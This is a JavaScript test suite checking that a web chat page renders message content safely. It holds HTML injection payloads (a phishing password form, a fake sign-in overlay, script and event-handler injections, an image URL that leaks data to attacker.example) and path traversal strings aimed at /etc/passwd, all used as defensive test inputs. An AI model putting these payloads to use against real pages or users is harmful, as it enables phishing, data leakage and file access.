import test from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { createRequire } from 'node:module'

const require = createRequire(import.meta.url)
const { JSDOM, ResourceLoader, VirtualConsole } = require('jsdom')

const here = path.dirname(fileURLToPath(import.meta.url))
const LIBS = process.env.LIBS_DIR
const MANIFEST = process.env.STATIC_MANIFEST || path.join(LIBS || '', '..', 'manifest.json')
const PAGE = fs.readFileSync(process.env.PAGE_FILE || path.join(here, '..', '_layouts', 'webchat.html'), 'utf8')
  .replace('{{ title }}', 'chat')
  .replace('{{ defaultTemplate.UserSpaceScripts() }}', '')

const PREFIX = '/_system/webchatproxy'

function roles() {
  const out = {}
  for (const entry of JSON.parse(fs.readFileSync(MANIFEST, 'utf8')).files) if (entry.role !== 'font') out[entry.role] = entry.served
  return out
}

function answer(body, status = 200) {
  return { ok: status >= 200 && status < 300, status, redirected: false, headers: { get: () => 'application/json' }, json: async () => body, text: async () => JSON.stringify(body) }
}

async function mount(messages) {
  const requested = []
  const served = roles()
  const loader = new (class extends ResourceLoader {
    fetch(url) {
      requested.push(url)
      const name = decodeURIComponent(url.split('/static/')[1] || '')
      const file = path.join(LIBS, name)
      return fs.existsSync(file) ? Promise.resolve(fs.readFileSync(file)) : Promise.resolve(null)
    }
  })()
  const dom = new JSDOM(PAGE, {
    url: 'https://agent.example.com/webchat#s1',
    runScripts: 'dangerously',
    resources: loader,
    virtualConsole: new VirtualConsole(),
    pretendToBeVisual: true,
    beforeParse(window) {
      window.matchMedia = () => ({ matches: false, addEventListener() {}, removeEventListener() {} })
      window.fetch = async (url) => {
        requested.push(String(url))
        const route = String(url).replace(PREFIX, '')
        if (route.startsWith('/static/manifest.json')) return answer(served)
        if (route.startsWith('/api/sessions?')) return answer({ data: [{ id: 's1', title: 'probe', source: 'api_server', last_active: 1 }] })
        if (route.startsWith('/api/sessions/s1/messages')) return answer({ data: messages })
        if (route.startsWith('/api/files')) return answer({ files: [] })
        return answer({}, 501)
      }
    },
  })
  const deadline = Date.now() + 15000
  while (Date.now() < deadline && !dom.window.document.querySelector('.msg')) await new Promise((r) => setTimeout(r, 50))
  await new Promise((r) => setTimeout(r, 300))
  return { dom, requested, document: dom.window.document }
}

const skip = LIBS ? false : 'set LIBS_DIR to the proxy\'s internal/static/files'

function rendered(role, content) {
  return mount([{ role, content }]).then((page) => ({ ...page, body: page.document.querySelector('.msg .body') }))
}

const INJECTIONS = {
  'style element': '<style>#composer{display:none} body::after{content:"x";background:url(https://attacker.example/beacon)}</style>',
  'style attribute overlay': '<div style="position:fixed;inset:0;z-index:99999;background:#fff">Session expired <a href="https://attacker.example">sign in</a></div>',
  'form': '<form action="https://attacker.example/phish" method="post"><input name="password" type="password"><button>Sign in</button></form>',
  'iframe': '<iframe src="https://attacker.example/frame"></iframe>',
  'script': '<script>window.owned = 1</script>',
  'onerror': '<img src=x onerror="window.owned=1">',
  'svg': '<svg onload="window.owned=1"><style>*{display:none}</style></svg>',
  'link tag': '<link rel="stylesheet" href="https://attacker.example/x.css">',
  'inline html in a sentence': 'hello <b style="color:red">bold</b> <input value="x"> world',
}

for (const role of ['user', 'assistant']) {
  for (const [name, payload] of Object.entries(INJECTIONS)) {
    test(`${role} message with ${name} shows the markup as text and styles nothing`, { skip }, async () => {
      const { dom, requested, body } = await rendered(role, payload)
      assert.equal(dom.window.owned, undefined)
      for (const tag of ['style', 'form', 'input', 'button', 'iframe', 'script', 'link', 'svg']) {
        assert.equal(body.querySelectorAll(tag).length, 0, `a ${tag} survived in ${body.innerHTML}`)
      }
      assert.equal(body.querySelectorAll('[style]').length, 0, `a style attribute survived in ${body.innerHTML}`)
      assert.equal(body.querySelectorAll('[onerror],[onload]').length, 0)
      assert.ok(body.textContent.includes('<'), 'the raw markup should be visible as text')
      assert.equal(requested.filter((u) => u.includes('attacker.example')).length, 0)
    })
  }
}

test('the page itself never carries a style or form from a message into the document', { skip }, async () => {
  const { document } = await mount([{ role: 'assistant', content: INJECTIONS['style element'] + '\n\n' + INJECTIONS.form }])
  const own = document.querySelectorAll('head style').length
  assert.equal(document.querySelectorAll('#messages style, #messages form, #messages .body input, #messages .body button').length, 0)
  assert.ok(own >= 1)
})

test('a remote picture is a link chip and nothing is fetched from its host', { skip }, async () => {
  const { requested, body } = await rendered('assistant', '![leak](https://attacker.example/leak?d=secret)\n\n<img src="https://attacker.example/raw.png">')
  assert.equal(body.querySelectorAll('img[src^="http"]').length, 0)
  assert.equal(body.querySelectorAll('img[src*="attacker"]').length, 0)
  assert.equal(body.querySelectorAll('img[data-src]').length, 0)
  assert.ok(body.querySelector('a.chip[href^="https://attacker.example/leak"]'))
  assert.equal(requested.filter((u) => u.includes('attacker.example')).length, 0)
})

test('a picture from the cache and a data: picture still show inline', { skip }, async () => {
  const { body } = await rendered('assistant', '![a](sandbox:/opt/webchat-files/out/a.png)\n\n![b](data:image/png;base64,iVBORw0KGgo=)')
  const sources = [...body.querySelectorAll('img')].map((i) => i.getAttribute('src'))
  assert.ok(sources.some((s) => s === `${PREFIX}/api/files/out/a.png`), sources.join())
  assert.ok(sources.some((s) => s.startsWith('data:image/png')))
})

const ESCAPES = [
  '@../../oauth2/sign_out',
  '@a/../../x',
  '@./x.pdf',
  '@a//b.pdf',
  '@a/%2e%2e/b.pdf',
  '@a%2f..%2fb.pdf',
  '@a/b%5c..%5cc.pdf',
  'sandbox:/opt/webchat-files/../../etc/passwd',
  'sandbox:/opt/webchat-files/out/../../x.png',
  'MEDIA:/opt/webchat-files/out/../../y.png',
  '![x](sandbox:/opt/webchat-files/%2e%2e/x.png)',
  '[x](sandbox:/opt/webchat-files/out/../../x.pdf)',
  '@/opt/webchat-files/../x.pdf',
]

for (const text of ESCAPES) {
  test(`${text} never becomes a request outside the cache folder`, { skip }, async () => {
    const { requested, body } = await rendered('assistant', `see ${text} now`)
    const urls = [...body.querySelectorAll('a[href], img[src]')].map((n) => n.getAttribute('href') || n.getAttribute('src'))
    for (const url of urls) assert.ok(!/\.\.|%2e|%2f|%5c/i.test(url), `a link carries ${url}`)
    const calls = requested.filter((u) => u.includes('/api/files/') && !/^.*\/api\/files\/[^.%]+$/.test(u) && u.includes('..'))
    assert.deepEqual(calls, [])
    assert.ok(body.querySelector('.chip.outside'), `no muted chip in ${body.innerHTML}`)
  })
}

test('a normal attached file and the same file named twice show once', { skip }, async () => {
  const { body } = await rendered('assistant', '@3fa91c2e/report.pdf and again @3fa91c2e/report.pdf and [r](sandbox:/opt/webchat-files/3fa91c2e/report.pdf)')
  const chips = [...body.querySelectorAll('a.chip')]
  assert.equal(chips.length, 1)
  assert.equal(chips[0].getAttribute('href'), `${PREFIX}/api/files/3fa91c2e/report.pdf`)
  assert.equal(chips[0].textContent, '@report.pdf')
})

test('markdown still renders: headings, lists, a table in its own box, highlighted code, math', { skip }, async () => {
  const text = '# Title\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n```python\nprint(1)\n```\n\n$$x^2$$\n'
  const { document } = await mount([{ role: 'assistant', content: text }])
  await new Promise((r) => setTimeout(r, 1500))
  const body = document.querySelector('.msg .body')
  assert.ok(body.querySelector('h1'))
  assert.equal(body.querySelectorAll('li').length, 2)
  assert.ok(body.querySelector('.table-wrap table'))
  assert.ok(body.querySelector('code.language-python .hljs-built_in, code.language-python .hljs-number'), body.innerHTML)
  assert.ok(body.querySelector('.katex'), body.innerHTML)
})
